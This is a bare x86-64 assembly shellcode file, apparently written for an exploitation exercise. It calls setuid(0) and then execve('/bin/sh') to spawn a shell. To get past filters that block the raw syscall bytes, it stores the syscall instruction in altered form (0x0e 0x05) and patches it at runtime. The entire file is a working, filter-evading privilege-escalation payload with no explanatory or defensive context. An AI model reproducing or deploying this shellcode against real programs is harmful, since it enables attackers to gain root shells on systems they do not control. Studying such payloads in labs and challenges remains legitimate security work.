.global _start
_start:
.intel_syntax noprefix
	mov al, 105
	xor rdi, rdi
	inc byte ptr [rip+sys_call] 
	jmp sys_call
exec_syscall:
	xor rax, rax
	mov al, 59
	lea rdi, [rip+binsh]
	xor rsi, rsi
	xor rdx, rdx
	jmp sys_call
sys_call:
	.byte 0x0e, 0x05
	jmp exec_syscall	
binsh:
	.string "/bin/sh"


